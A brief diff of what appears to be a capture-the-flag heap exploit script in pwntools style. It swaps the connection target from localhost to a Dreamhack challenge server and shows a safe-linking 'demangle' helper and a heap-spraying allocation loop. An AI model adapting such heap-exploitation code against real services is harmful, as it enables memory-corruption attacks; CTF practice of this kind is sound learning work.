@@ -41,7 +41,7 @@ def demangle(val):
     mask >>= 12
   return val
 
-io = remote('localhost', 1337)
+io = remote('host3.dreamhack.games', 8689)
 
 mapping = {}
 for i in range(0x140-5): make(0x100, f'heap_{i}'.encode(), True)
